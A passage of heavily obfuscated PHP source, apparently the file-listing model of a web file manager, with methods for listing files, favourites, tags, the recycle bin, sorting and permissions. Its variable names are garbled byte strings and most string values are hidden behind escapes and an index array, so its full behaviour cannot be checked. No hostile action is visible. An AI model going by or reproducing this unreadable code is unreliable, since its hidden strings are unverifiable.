= false, $œ¤¨˜å = '') { $ÂÌ¸üö = explode($_SERVER[¿ğÚ‰±–][10], $·ßƒ»®å); $ëÏ¸Íİ¾ = $this->get(); array_set_value($ëÏ¸Íİ¾, $·ßƒ»®å, $ ›Çéê—); $this->set($ÂÌ¸üö[0], $ëÏ¸Íİ¾[$ÂÌ¸üö[0]], $œ¤¨˜å); } public function remove($Å…Çà©ñ, $ÍŠ½Šå = '') { $Ê¢»ïü· =& $_SERVER[¿ğÚ‰±–]; $this->cacheRemove($ÍŠ½Šå); $Î€Î†ˆÍ = $this->filterWhere(array($Ê¢»ïü·[97] => $Å…Çà©ñ, $Ê¢»ïü·[33] => $ÍŠ½Šå)); if (is_null($Å…Çà©ñ)) { unset($Î€Î†ˆÍ[$Ê¢»ïü·[97]]); } return $this->where($Î€Î†ˆÍ)->delete(); } public function cacheSet($¦ÑÛÃ•§, $¨Œ€Ñ– = false) { return Cache::set($this->cacheKey($¦ÑÛÃ•§), $¨Œ€Ñ–); } public function cacheGet($Ş¿Ø˜×ë) { return Cache::get($this->cacheKey($Ş¿Ø˜×ë)); } public function cacheRemove($¦ç¤õôÒ) { return Cache::remove($this->cacheKey($¦ç¤õôÒ)); } protected function filterWhere($¢ÌÁ€¶¼) { return $¢ÌÁ€¶¼; } protected function cacheKey($Âıµº²ş) { return $Âıµº²ş; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\x75\162\x63\x65"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\141\155\x65" => "\151\x6f\137\163\x6f\165\x72\143\145\137\155\x65\x74\141", "\x6d\145\x74\x61\x46\x69\x65\x6c\x64" => "\x73\157\x75\x72\x63\145\111\x44"); protected $dataAuto = array(array("\155\x6f\144\x69\x66\171\x54\x69\x6d\145", "\164\x69\155\145", "\x69\156\163\x65\x72\x74", "\146\x75\x6e\143\x74\x69\x6f\156"), array("\x63\x72\x65\141\x74\145\124\x69\x6d\x65", "\164\151\x6d\145", "\x69\x6e\163\x65\x72\164", "\146\x75\x6e\x63\x74\x69\x6f\156"), array("\x76\x69\x65\x77\x54\x69\155\145", "\164\x69\155\145", "\x69\156\x73\145\x72\164", "\x66\x75\x6e\x63\164\x69\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Ç¼†öÜ¿) { return $this->listSource(array($_SERVER[¿ğÚ‰±–][477] => $Ç¼†öÜ¿)); } public function typeName($®›ù¿—ù) { static $„¢¡øë™ = array(self::TYPE_SYSTEM => "\x73\x79\x73\164\145\155", self::TYPE_USER => "\x75\x73\145\x72", self::TYPE_GROUP => "\x67\162\157\x75\x70"); return $„¢¡øë™[$®›ù¿—ù . $_SERVER[¿ğÚ‰±–][12]]; } public function sourceListInfo($ÕÏØ»¾, $«ĞÖšû = false) { $Áû™„ş =& $_SERVER[¿ğÚ‰±–]; $ÕÏØ»¾ = $ÕÏØ»¾ ? $ÕÏØ»¾ : array(); $ÕÏØ»¾ = array_filter(array_unique($ÕÏØ»¾)); if (!$ÕÏØ»¾) { return array(); } $ÔÃŒô¢¼ = $this->where(array($Áû™„ş[193] => array($Áû™„ş[7], $ÕÏØ»¾)))->select(); $this->_listDataApply($ÔÃŒô¢¼, $«ĞÖšû); return array_to_keyvalue($ÔÃŒô¢¼, $Áû™„ş[193]); } public function pathInfoFilter(&$» ´Ôºî) { $ÓÂ­îÊÈ =& $_SERVER[¿ğÚ‰±–]; static $ŸƒõÛ¶¦ = false; static $Ÿ½óÎçÜ = false; static $¼œ×±‘Æ = false; if (!$ŸƒõÛ¶¦) { $Ü€ÇÆ‚ = $ÓÂ­îÊÈ[478]; $Ü€ÇÆ‚ .= $ÓÂ­îÊÈ[479]; $Ü€ÇÆ‚ .= $ÓÂ­îÊÈ[480]; $¯õ›ŒÛÍ = $ÓÂ­îÊÈ[481]; $üõ˜é = explode($ÓÂ­îÊÈ[50], $¯õ›ŒÛÍ); $ŸƒõÛ¶¦ = explode($ÓÂ­îÊÈ[50], $Ü€ÇÆ‚); $Ÿ½óÎçÜ = array(); foreach ($ŸƒõÛ¶¦ as $ÄƒÚÉİç) { if (in_array($ÄƒÚÉİç, $üõ˜é)) { continue; } $Ÿ½óÎçÜ[] = $ÄƒÚÉİç; } $¼œ×±‘Æ = explode($ÓÂ­îÊÈ[50], $ÓÂ­îÊÈ[482]); } foreach ($¼œ×±‘Æ as $ñóÃ¡™Í) { if (isset($» ´Ôºî[$ñóÃ¡™Í])) { $» ´Ôºî[$ñóÃ¡™Í] = intval($» ´Ôºî[$ñóÃ¡™Í]); } } $» ´Ôºî[$ÓÂ­îÊÈ[87]] = $ÓÂ­îÊÈ[483] . $» ´Ôºî[$ÓÂ­îÊÈ[193]] . $ÓÂ­îÊÈ[484]; $» ´Ôºî[$ÓÂ­îÊÈ[33]] = $» ´Ôºî[$ÓÂ­îÊÈ[485]] == 1 ? $ÓÂ­îÊÈ[78] : $ÓÂ­îÊÈ[230]; $» ´Ôºî[$ÓÂ­îÊÈ[190]] = $this->typeName($» ´Ôºî[$ÓÂ­îÊÈ[190]]); if ($» ´Ôºî[$ÓÂ­îÊÈ[485]] != 1) { $» ´Ôºî[$ÓÂ­îÊÈ[169]] = $» ´Ôºî[$ÓÂ­îÊÈ[486]]; unset($» ´Ôºî[$ÓÂ­îÊÈ[486]]); } $éÍƒÑ¨¸ = $ŸƒõÛ¶¦; if (isset($» ´Ôºî[$ÓÂ­îÊÈ[487]]) && $» ´Ôºî[$ÓÂ­îÊÈ[487]][$ÓÂ­îÊÈ[488]] == -1) { $éÍƒÑ¨¸ = $Ÿ½óÎçÜ; } $» ´Ôºî = array_field_key($» ´Ôºî, $éÍƒÑ¨¸); return $» ´Ôºî; } public function listUserFav() { $÷²Ê¦¥· =& $_SERVER[¿ğÚ‰±–]; $­ø¹İÅû = Model($÷²Ê¦¥·[489])->listData(); $Ïšñ™„· = array_filter_by_field($­ø¹İÅû, $÷²Ê¦¥·[33], $÷²Ê¦¥·[490]); $Ïšñ™„· = array_to_keyvalue($Ïšñ™„·, $÷²Ê¦¥·[12], $÷²Ê¦¥·[87]); if ($Ïšñ™„·) { $âòÃü±ô = $this->listSource(array($÷²Ê¦¥·[491] => array($÷²Ê¦¥·[492], $Ïšñ™„·))); } $âòÃü±ô = array_to_keyvalue($âòÃü±ô[$÷²Ê¦¥·[445]], $÷²Ê¦¥·[193]); foreach ($­ø¹İÅû as &$©˜‘àã›) { $©˜‘àã› = array($÷²Ê¦¥·[493] => $©˜‘àã›[$÷²Ê¦¥·[475]], $÷²Ê¦¥·[494] => $©˜‘àã›[$÷²Ê¦¥·[32]], $÷²Ê¦¥·[495] => $©˜‘àã›[$÷²Ê¦¥·[87]], $÷²Ê¦¥·[496] => $©˜‘àã›[$÷²Ê¦¥·[33]], $÷²Ê¦¥·[497] => $©˜‘àã›[$÷²Ê¦¥·[231]], $÷²Ê¦¥·[498] => $©˜‘àã›[$÷²Ê¦¥·[88]]); if ($©˜‘àã›[$÷²Ê¦¥·[33]] == $÷²Ê¦¥·[490] && $âòÃü±ô[$©˜‘àã›[$÷²Ê¦¥·[87]]]) { $©˜‘àã›[$÷²Ê¦¥·[90]] = $âòÃü±ô[$©˜‘àã›[$÷²Ê¦¥·[87]]]; } } unset($©˜‘àã›); return $­ø¹İÅû; } public function listUserTag($Ñè³õÍ‰) { $Ë™â Æƒ =& $_SERVER[¿ğÚ‰±–]; if ($Ñè³õÍ‰ && !is_array($Ñè³õÍ‰)) { $Ñè³õÍ‰ = array($Ñè³õÍ‰); } $°³Íé‡¶ = Model($Ë™â Æƒ[499])->listData(); $êÍÈ¨™† = array(); $ôØØü¡ = array(); foreach ($°³Íé‡¶ as $‡ì†ëµ) { $•Ğê«’¶ = $‡ì†ëµ[$Ë™â Æƒ[87]]; if (!$•Ğê«’¶) { continue; } if (!isset($ôØØü¡[$•Ğê«’¶])) { $ôØØü¡[$•Ğê«’¶] = array(); } $ôØØü¡[$•Ğê«’¶][] = $‡ì†ëµ[$Ë™â Æƒ[500]]; $êÍÈ¨™†[$‡ì†ëµ[$Ë™â Æƒ[87]]] = $‡ì†ëµ; } $ıèè¹ ş = array(); $ËÒÒş­÷ = array(); $Òãïİ¸Ì = array(); foreach ($ôØØü¡ as $†®ßéš¼ => $Ã‚¼¦…) { $ÅúÎ Ö” = !0; if (!$Ñè³õÍ‰) { $ıèè¹ ş[] = $†®ßéš¼; continue; } foreach ($Ñè³õÍ‰ as $ù¥Ì‘ÏÍ) { if (!in_array($ù¥Ì‘ÏÍ, $Ã‚¼¦…)) { $ÅúÎ Ö” = !1; break; } } if (!$ÅúÎ Ö”) { continue; } if (!is_numeric($†®ßéš¼)) { $¹ûÙ×û¬ = $êÍÈ¨™†[$†®ßéš¼]; $ÊœŒ©«É = array($Ë™â Æƒ[32] => $¹ûÙ×û¬[$Ë™â Æƒ[32]], $Ë™â Æƒ[87] => $¹ûÙ×û¬[$Ë™â Æƒ[87]], $Ë™â Æƒ[33] => $¹ûÙ×û¬[$Ë™â Æƒ[33]], $Ë™â Æƒ[90] => array($Ë™â Æƒ[501] => 1), $Ë™â Æƒ[232] => !0); if ($¹ûÙ×û¬[$Ë™â Æƒ[33]] == $Ë™â Æƒ[230]) { $Òãïİ¸Ì[] = $ÊœŒ©«É; } if ($¹ûÙ×û¬[$Ë™â Æƒ[33]] == $Ë™â Æƒ[78]) { $ËÒÒş­÷[] = $ÊœŒ©«É; } continue; } $ıèè¹ ş[] = $†®ßéš¼; } if ($ıèè¹ ş) { $óØ£ø³‚ = $this->listSource(array($Ë™â Æƒ[491] => array($Ë™â Æƒ[492], $ıèè¹ ş))); } $óØ£ø³‚ = $óØ£ø³‚ ? $óØ£ø³‚ : array($Ë™â Æƒ[85] => array(), $Ë™â Æƒ[86] => array()); $óØ£ø³‚[$Ë™â Æƒ[85]] = array_merge($óØ£ø³‚[$Ë™â Æƒ[85]], $ËÒÒş­÷); $óØ£ø³‚[$Ë™â Æƒ[86]] = array_merge($óØ£ø³‚[$Ë™â Æƒ[86]], $Òãïİ¸Ì); if (isset($óØ£ø³‚[$Ë™â Æƒ[442]]) && count($ıèè¹ ş) == $óØ£ø³‚[$Ë™â Æƒ[442]][$Ë™â Æƒ[443]]) { return $óØ£ø³‚; } $£ÓÒ¨™ë = array(); $™½ë¥Õ• = array_to_keyvalue($óØ£ø³‚[$Ë™â Æƒ[85]], $Ë™â Æƒ[12], $Ë™â Æƒ[193]); $º›ş©±â = array_to_keyvalue($óØ£ø³‚[$Ë™â Æƒ[86]], $Ë™â Æƒ[12], $Ë™â Æƒ[193]); $œîÎıÕÎ = array_merge($º›ş©±â, $™½ë¥Õ•); foreach ($ıèè¹ ş as $•Ğê«’¶) { if (!in_array($•Ğê«’¶, $œîÎıÕÎ)) { $£ÓÒ¨™ë[] = $•Ğê«’¶; } } if ($£ÓÒ¨™ë) { Model($Ë™â Æƒ[502])->removeBySource($£ÓÒ¨™ë); } return $óØ£ø³‚; } public function listUserRecycle() { $Ãƒö¼üÔ =& $_SERVER[¿ğÚ‰±–]; $¢Ìµ§úÆ = Model($Ãƒö¼üÔ[503])->listData(); if (!$¢Ìµ§úÆ) { return array(); } $ı÷ÒüÌş = array($Ãƒö¼üÔ[491] => array($Ãƒö¼üÔ[492], $¢Ìµ§úÆ), $Ãƒö¼üÔ[504] => 1); return $this->listSource($ı÷ÒüÌş); } public function listSource($‘ı«©‰î, $ëÙ’ÀĞğ = 3000, $ÂÓÆ¥¼È = false) { $”ÏÀüğ =& $_SERVER[¿ğÚ‰±–]; if (!isset($‘ı«©‰î[$”ÏÀüğ[505]])) { $‘ı«©‰î[$”ÏÀüğ[505]] = 0; } if (isset($‘ı«©‰î[$”ÏÀüğ[192]]) && $‘ı«©‰î[$”ÏÀüğ[192]] == $”ÏÀüğ[228]) { $‘ı«©‰î[$”ÏÀüğ[486]] = array($”ÏÀüğ[407], $”ÏÀüğ[506]); } $İûóæå = $”ÏÀüğ[507]; $ê–ã·ˆˆ = $this->field($İûóæå)->_makeOrder()->where($‘ı«©‰î)->selectPage($ëÙ’ÀĞğ); $this->_listPageCheck($ê–ã·ˆˆ, $İûóæå, $‘ı«©‰î); $this->_listDataApply($ê–ã·ˆˆ[$”ÏÀüğ[445]], $ÂÓÆ¥¼È); $this->_listMake($ê–ã·ˆˆ); return $ê–ã·ˆˆ; } private function _listPageCheck(&$˜é—êÚ¼, $ÙÏ€ŸØÃ, $ƒ¬ºáÛù) { $¹±—Šü =& $_SERVER[¿ğÚ‰±–]; if (!is_array($˜é—êÚ¼[$¹±—Šü[442]])) { return; } $ÛÃøŠŒ¼ = $˜é—êÚ¼[$¹±—Šü[442]]; if ($ÛÃøŠŒ¼[$¹±—Šü[444]] <= 1) { return; } if ($ÛÃøŠŒ¼[$¹±—Šü[443]] >= 100000) { return; } if (Model($¹±—Šü[508])->get($¹±—Šü[509]) != $¹±—Šü[510]) { return; } $ÙÏ€ŸØÃ = str_replace(array($¹±—Šü[53], $¹±—Šü[418], $¹±—Šü[262]), $¹±—Šü[12], $ÙÏ€ŸØÃ); $ÙÏ€ŸØÃ = $¹±—Šü[511] . str_replace($¹±—Šü[50], $¹±—Šü[512], $ÙÏ€ŸØÃ) . $¹±—Šü[513]; $á‰×Œæ¦ = $¹±—Šü[514]; $á‰×Œæ¦ = $á‰×Œæ¦ . $¹±—Šü[515]; $Â‰Ò‹ûÛ = $ÛÃøŠŒ¼[$¹±—Šü[439]] * ($ÛÃøŠŒ¼[$¹±—Šü[429]] - 1) . $¹±—Šü[50] . $ÛÃøŠŒ¼[$¹±—Šü[439]]; $óÄÇçÄÀ = $this->_makeOrder(!0); $–¸ËıÛÇ = $¹±—Šü[511] . str_replace($¹±—Šü[50], $¹±—Šü[512], $óÄÇçÄÀ[0]); if (strpos($–¸ËıÛÇ, $¹±—Šü[516])) { $–¸ËıÛÇ = str_replace($¹±—Šü[516], $¹±—Šü[517], $–¸ËıÛÇ); } else { $–¸ËıÛÇ .= $¹±—Šü[518] . $óÄÇçÄÀ[1]; } $Ü°åî = array(); foreach ($ƒ¬ºáÛù as $Û¶êÚáâ => $…¤İØ¤) { $Ü°åî[$¹±—Šü[511] . $Û¶êÚáâ] = $…¤İØ¤; } $this->alias($¹±—Šü[519])->field($ÙÏ€ŸØÃ)->limit($Â‰Ò‹ûÛ)->order($–¸ËıÛÇ); $ˆ¥Ôº˜¾ = $this->join($á‰×Œæ¦)->where($Ü°åî)->select(); if ($ˆ¥Ôº˜¾) { $˜é—êÚ¼[$¹±—Šü[445]] = $ˆ¥Ôº˜¾; } } protected function _makeOrder($»—ÓªÇÆ = false) { $ÆçëıÇù =& $_SERVER[¿ğÚ‰±–]; $Ôî¯íàú = Model($ÆçëıÇù[520])->get($ÆçëıÇù[521]); $”ºùû”û = Model($ÆçëıÇù[520])->get($ÆçëıÇù[522]); $Üü·ãØß = array($ÆçëıÇù[523] => $ÆçëıÇù[524], $ÆçëıÇù[525] => $ÆçëıÇù[526]); $¹ï¶¨é = array($ÆçëıÇù[32] => $ÆçëıÇù[32], $ÆçëıÇù[79] => $ÆçëıÇù[79], $ÆçëıÇù[169] => $ÆçëıÇù[486], $ÆçëıÇù[527] => $ÆçëıÇù[527], $ÆçëıÇù[528] => $ÆçëıÇù[529], $ÆçëıÇù[231] => $ÆçëıÇù[231], $ÆçëıÇù[88] => $ÆçëıÇù[88]); $òÉ‚‚º‹ = Input::get($ÆçëıÇù[530], $ÆçëıÇù[7], $Ôî¯íàú, array_keys($¹ï¶¨é)); $šÄ÷³ü£ = Input::get($ÆçëıÇù[531], $ÆçëıÇù[7], $”ºùû”û, array_keys($Üü·ãØß)); if (!in_array($òÉ‚‚º‹, array_keys($¹ï¶¨é))) { $òÉ‚‚º‹ = $ÆçëıÇù[32]; } if (!in_array($šÄ÷³ü£, array_keys($Üü·ãØß))) { $òÉ‚‚º‹ = $ÆçëıÇù[523]; } if ($òÉ‚‚º‹ == $ÆçëıÇù[32]) { } $´ÉŒåû´ = $ÆçëıÇù[532] . $¹ï¶¨é[$òÉ‚‚º‹] . $ÆçëıÇù[53] . $Üü·ãØß[$šÄ÷³ü£]; $´ÉŒåû´ = rtrim(trim($´ÉŒåû´), $ÆçëıÇù[50]); if ($»—ÓªÇÆ) { return array($´ÉŒåû´, $Üü·ãØß[$šÄ÷³ü£]); } return $this->order($´ÉŒåû´); } protected function _listDataApplyItem($»èåäœœ, $„‰ãØ™Ì = false) { $ëÚ¼ø§¼ = array($»èåäœœ); $this->_listDataApply($ëÚ¼ø§¼, $„‰ãØ™Ì); return $ëÚ¼ø§¼[0]; } protected function _listDataApply(&$ÅÕßø×®, $äÉÒô— = false) { $öØ÷ËÍ‡ =& $_SERVER[¿ğÚ‰±–]; if (!$ÅÕßø×®) { $ÅÕßø×® = array(); return; } $µ—íŒœØ = array_to_keyvalue($ÅÕßø×®, $öØ÷ËÍ‡[12], $öØ÷ËÍ‡[193]); $µ—íŒœØ = array_unique($µ—íŒœØ); $this->_listSourceCache($ÅÕßø×®); if (!$äÉÒô—) { $this->_listAppendMeta($ÅÕßø×®, $µ—íŒœØ); $this->_listAppendFileMeta($ÅÕßø×®, $µ—íŒœØ); $this->_listAppendChildren($ÅÕßø×®, $µ—íŒœØ); } $this->_listAppendPath($ÅÕßø×®); $this->_listAppendAuth($ÅÕßø×®); $this->_listAppendSourceInfo($ÅÕßø×®, $µ—íŒœØ); $this->_listAppendUser($ÅÕßø×®); $this->_listFilterInfo($ÅÕßø×®, $äÉÒô—); $this->_listAppendAuthSecret($ÅÕßø×®); } protected function _listSourceCache($Ì„¬­üÈ) { $ÎóÚ·¡ä =& $_SERVER[¿ğÚ‰±–]; foreach ($Ì„¬­üÈ as $û¾°‚İî) { self::$cacheSourceInfo[$ÎóÚ·¡ä[533] . $û¾°‚İî[$ÎóÚ·¡ä[193]]] = $û¾°‚İî; } } protected function _listFilterInfo(&$àº»ü¯†, $ØëÕóÙÚ = false) { $²à£Âê— =& $_SERVER[¿ğÚ‰±–]; foreach ($àº»ü¯† as &$‡ ÇºŞÄ) { $‡ ÇºŞÄ = $this->pathInfoFilter($‡ ÇºŞÄ); self::$cachePathInfo[$²à£Âê—[534] . intval($ØëÕóÙÚ) . $²à£Âê—[462] . $‡ ÇºŞÄ[$²à£Âê—[193]]] = $‡ ÇºŞÄ; } unset($‡ ÇºŞÄ); } protected function _listMake(&$ÑÔ‹æŒé) { $úô®†ö =& $_SERVER[¿ğÚ‰±–]; $ÑÔ‹æŒé[$úô®†ö[85]] = array(); $ÑÔ‹æŒé[$úô®†ö[86]] = array(); foreach ($ÑÔ‹æŒé[$úô®†ö[445]] as $½±ˆËÓ¬) { $¡ÕÈ¤Ó = $½±ˆËÓ¬[$úô®†ö[485]] == 1 ? $úô®†ö[85] : $úô®†ö[86]; $ÑÔ‹æŒé[$¡ÕÈ¤Ó][] = $½±ˆËÓ¬; } unset($ÑÔ‹æŒé[$úô®†ö[445]]); } protected function _listAppendMeta(&$õ—Ïá£, $ÍĞô£¬Á) { $ñ¸™ =& $_SERVER[¿ğÚ‰±–]; $´Çæ¥„æ = array($ñ¸™[491] => array($ñ¸™[492], $ÍĞô£¬Á)); $ãå¨Ğ¼Ø = Model($ñ¸™[535])->field($ñ¸™[536])->where($´Çæ¥„æ)->select(); if (!$ãå¨Ğ¼Ø) { return; } $ªùë˜×Õ = array($ñ¸™[537], $ñ¸™[538], $ñ¸™[517]); $ÆÛÙ¾ç = array(); foreach ($ãå¨Ğ¼Ø as $Ôü¯¡©) { if (!isset($ÆÛÙ¾ç[$Ôü¯¡©[$ñ¸™[193]]])) { $ÆÛÙ¾ç[$Ôü¯¡©[$ñ¸™[193]]] = array(); } if (in_array($Ôü¯¡©[$ñ¸™[97]], $ªùë˜×Õ)) { continue; } $ÆÛÙ¾ç[$Ôü¯¡©[$ñ¸™[193]]][$Ôü¯¡©[$ñ¸™[97]]] = $Ôü¯¡©[$ñ¸™[450]]; } foreach ($õ—Ïá£ as &$˜Üƒ°Š¹) { $˜Üƒ°Š¹[$ñ¸™[539]] = !1; if (isset($ÆÛÙ¾ç[$˜Üƒ°Š¹[$ñ¸™[193]]])) { $˜Üƒ°Š¹[$ñ¸™[539]] = $ÆÛÙ¾ç[$˜Üƒ°Š¹[$ñ¸™[193]]]; } if ($this->fileIsLock($˜Üƒ°Š¹) && $˜Üƒ°Š¹[$ñ¸™[487]]) { $õ£ï¥ÖÛ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $˜Üƒ°Š¹[$ñ¸™[487]][$ñ¸™[488]] = AuthModel::authDisable($˜Üƒ°Š¹[$ñ¸™[487]][$ñ¸™[488]], $õ£ï¥ÖÛ); $˜Üƒ°Š¹[$ñ¸™[487]][$ñ¸™[540]][$ñ¸™[487]] = $˜Üƒ°Š¹[$ñ¸™[487]][$ñ¸™[488]]; } } unset($˜Üƒ°Š¹); } protected function _listAppendFileMeta(&$›ºÕöÇ‚, $çÄÃœ²Æ) { $×Õ×¨·· =& $_SERVER[¿ğÚ‰±–]; $ûŠ³ÔÕ† = array_to_keyvalue($›ºÕöÇ‚, $×Õ×¨··[12], $×Õ×¨··[541]); $ûŠ³ÔÕ† = array_filter(array_unique($ûŠ³ÔÕ†)); if (!$ûŠ³ÔÕ†) { return; } $ÉßŸÏñ = array($×Õ×¨··[542] => array($×Õ×¨··[492], $ûŠ³ÔÕ†)); $„ÄÌ­“ = $×Õ×¨··[543]; $¥ï¤ö„Ù = Model($×Õ×¨··[544])->field($„ÄÌ­“)->where($ÉßŸÏñ)->select(); $¥ï¤ö„Ù = array_to_keyvalue($¥ï¤ö„Ù, $×Õ×¨··[541]); $üşõ³ÃÓ = Model($×Õ×¨··[545])->field($×Õ×¨··[546])->where($ÉßŸÏñ)->select(); $üşõ³ÃÓ = $üşõ³ÃÓ ? $üşõ³ÃÓ : array(); $Í¤ÏëŞ = array(); foreach ($üşõ³ÃÓ as $ÎÀíóğ“) { if (!isset($Í¤ÏëŞ[$ÎÀíóğ“[$×Õ×¨··[541]]])) { $Í¤ÏëŞ[$ÎÀíóğ“[$×Õ×¨··[541]]] = array(); } $Í¤ÏëŞ[$ÎÀíóğ“[$×Õ×¨··[541]]][$ÎÀíóğ“[$×Õ×¨··[97]]] = $ÎÀíóğ“[$×Õ×¨··[450]]; } foreach ($›ºÕöÇ‚ as &$· ó÷÷) { $°Šâ³›§ = $· ó÷÷[$×Õ×¨··[541]]; if (!$°Šâ³›§ || !is_array($¥ï¤ö„Ù[$°Šâ³›§])) { continue; } $øÍ æÍê = $¥ï¤ö„Ù[$°Šâ³›§]; $øÍ æÍê[$×Õ×¨··[79]] = $· ó÷÷[$×Õ×¨··[79]]; $øÍ æÍê[$×Õ×¨··[32]] = $· ó÷÷[$×Õ×¨··[32]]; if (!$øÍ æÍê[$×Õ×¨··[547]]) { Model($×Õ×¨··[544])->fileMd5Check($øÍ æÍê); } if (!isset(self::$cacheFileInfo[$×Õ×¨··[548] . $°Šâ³›§])) { self::$cacheFileInfo[$×Õ×¨··[548] . $°Šâ³›§] = array_merge(array(), $øÍ æÍê); } unset($¥ï¤ö„Ù[$°Šâ³›§][$×Õ×¨··[87]]); $…ô¸‹Ğå = isset($Í¤ÏëŞ[$°Šâ³›§]) && is_array($Í¤ÏëŞ[$°Šâ³›§]) ? $Í¤ÏëŞ[$°Šâ³›§] : array(); $· ó÷÷[$×Õ×¨··[170]] = array_merge($…ô¸‹Ğå, $¥ï¤ö„Ù[$°Šâ³›§]); if (isset($· ó÷÷[$×Õ×¨··[170]][$×Õ×¨··[184]])) { $· ó÷÷[$×Õ×¨··[184]] = json_decode($· ó÷÷[$×Õ×¨··[170]][$×Õ×¨··[184]], !0); unset($· ó÷÷[$×Õ×¨··[170]][$×Õ×¨··[184]]); } } unset($· ó÷÷); } protected function _listAppendSourceInfo(&$Ü¬›ÍÁ–, $¨Íñóıñ) { $³å«ùÕ™ =& $_SERVER[¿ğÚ‰±–]; $ÄÎÅ° = Model($³å«ùÕ™[549])->listData(); $ç¼Ã¾¨ = Model($³å«ùÕ™[499])->listData(); $ ®´¾Ë = Model($³å«ùÕ™[489])->listData(); $ğˆôÔ‘¯ = Model($³å«ùÕ™[550])->listSimple(); $Š‘¼¬û½ = array_to_keyvalue($ÄÎÅ°, $³å«ùÕ™[475]); $Œ¶¬ü§å = array_to_keyvalue_group($ç¼Ã¾¨, $³å«ùÕ™[87], $³å«ùÕ™[500]); $ÄĞº¹÷ä = array_to_keyvalue($ ®´¾Ë, $³å«ùÕ™[87]); $öÛÎ‰£ = array_to_keyvalue_group($ğˆôÔ‘¯, $³å«ùÕ™[193]); foreach ($Ü¬›ÍÁ– as &$Äë‚şÃß) { $Äë‚şÃß[$³å«ùÕ™[90]] = array($³å«ùÕ™[551] => 0, $³å«ùÕ™[552] => 0, $³å«ùÕ™[553] => 0); if (isset($ÄĞº¹÷ä[$Äë‚şÃß[$³å«ùÕ™[193]]])) { $Äë‚şÃß[$³å«ùÕ™[90]][$³å«ùÕ™[554]] = 1; $Äë‚şÃß[$³å«ùÕ™[90]][$³å«ùÕ™[555]] = $ÄĞº¹÷ä[$Äë‚şÃß[$³å«ùÕ™[193]]][$³å«ùÕ™[32]]; } if ($Œ¶¬ü§å && $Š‘¼¬û½ && isset($Œ¶¬ü§å[$Äë‚şÃß[$³å«ùÕ™[193]]])) { $Äë‚şÃß[$³å«ùÕ™[90]][$³å«ùÕ™[556]] = array(); foreach ($Œ¶¬ü§å[$Äë‚şÃß[$³å«ùÕ™[193]]] as $ŸŠÖ©©Œ) { $Òê¾¬ìŠ = $Š‘¼¬û½[$ŸŠÖ©©Œ]; $Äë‚şÃß[$³å«ùÕ™[90]][$³å«ùÕ™[556]][] = array($³å«ùÕ™[557] => $Òê¾¬ìŠ[$³å«ùÕ™[475]], $³å«ùÕ™[494] => $Òê¾¬ìŠ[$³å«ùÕ™[32]], $³å«ùÕ™[558] => $Òê¾¬ìŠ[$³å«ùÕ™[559]]); } } if ($öÛÎ‰£ && isset($öÛÎ‰£[$Äë‚şÃß[$³å«ùÕ™[193]]])) { $Äë‚şÃß[$³å«ùÕ™[90]][$³å«ùÕ™[560]] = array(); foreach ($öÛÎ‰£[$Äë‚şÃß[$³å«ùÕ™[193]]] as $ğÒ‡³³) { $ÃŞˆ÷Õ = $³å«ùÕ™[561]; if ($ğÒ‡³³[$³å«ùÕ™[562]] == $³å«ùÕ™[91]) { $ÃŞˆ÷Õ .= $³å«ùÕ™[563]; } $Äë‚şÃß[$³å«ùÕ™[90]][$³å«ùÕ™[560]] = array_field_key($ğÒ‡³³, explode($³å«ùÕ™[50], $ÃŞˆ÷Õ)); } } } unset($Äë‚şÃß); return $Ü¬›ÍÁ–; } protected function _listAppendChildren(&$ö‚ŸÖÃû, $Ó˜±ş®) { $ùıåÖ ã =& $_SERVER[¿ğÚ‰±–]; $½ı·µÛò = array(); $ß¬î¸À = array($ùıåÖ ã[239] => 0, $ùıåÖ ã[240] => 0); foreach ($ö‚ŸÖÃû as &$°ã®¸­‚) { if (!$°ã®¸­‚[$ùıåÖ ã[485]]) { continue; } $½ı·µÛò[] = $°ã®¸­‚[$ùıåÖ ã[193]]; } unset($°ã®¸­‚); if (!$½ı·µÛò) { return; } $úÃßéÂÈ = array($ùıåÖ ã[192] => array($ùıåÖ ã[7], $½ı·µÛò), $ùıåÖ ã[505] => 0); $°Ù™ßêš = array($ùıåÖ ã[192], $ùıåÖ ã[485], $ùıåÖ ã[564] => $ùıåÖ ã[565]); $•Ø“ü = $this->field($°Ù™ßêš)->where($úÃßéÂÈ)->group($ùıåÖ ã[566])->select(); $—ŸÖéÍî = array(); foreach ($•Ø“ü as $¿º¿òç¼) { $®ü¡¼ª¶ = $¿º¿òç¼[$ùıåÖ ã[192]]; $¦…Åø‘¿ = $¿º¿òç¼[$ùıåÖ ã[485]] == $ùıåÖ ã[91] ? $ùıåÖ ã[240] : $ùıåÖ ã[239]; if (!isset($—ŸÖéÍî[$®ü¡¼ª¶])) { $—ŸÖéÍî[$®ü¡¼ª¶] = array($ùıåÖ ã[239] => 0, $ùıåÖ ã[240] => 0); } $—ŸÖéÍî[$®ü¡¼ª¶][$¦…Åø‘¿] += $¿º¿òç¼[$ùıåÖ ã[565]]; } foreach ($ö‚ŸÖÃû as &$°ã®¸­‚) { if (!$°ã®¸­‚[$ùıåÖ ã[485]]) { continue; } $ê³¤õÓ = is_array($—ŸÖéÍî[$°ã®¸­‚[$ùıåÖ ã[193]]]) ? $—ŸÖéÍî[$°ã®¸­‚[$ùıåÖ ã[193]]] : $ß¬î¸À; $°ã®¸­‚[$ùıåÖ ã[240]] = $ê³¤õÓ[$ùıåÖ ã[240]]; $°ã®¸­‚[$ùıåÖ ã[239]] = $ê³¤õÓ[$ùıåÖ ã[239]]; unset($°ã®¸­‚[$ùıåÖ ã[486]]); } unset($°ã®¸­‚); } protected function _listAppendAuth(&$ïçõàõÈ) { $™ûÉç‡¼ =& $_SERVER[¿ğÚ‰±–]; $À¼ì™±º = array(); foreach ($ïçõàõÈ as $ò” ¬™Ú) { if ($ò” ¬™Ú[$™ûÉç‡¼[190]] == self::TYPE_GROUP) { $À¼ì™±º[] = $ò” ¬™Ú[$™ûÉç‡¼[193]]; } } if (!$À¼ì™±º) { return; } $€”å®Î = array_to_keyvalue($ïçõàõÈ, $™ûÉç‡¼[193]); $³“Ÿ°öŠ = Model($™ûÉç‡¼[567])->getSourceList($À¼ì™±º, $€”å®Î); $Åá‹¤‘ = 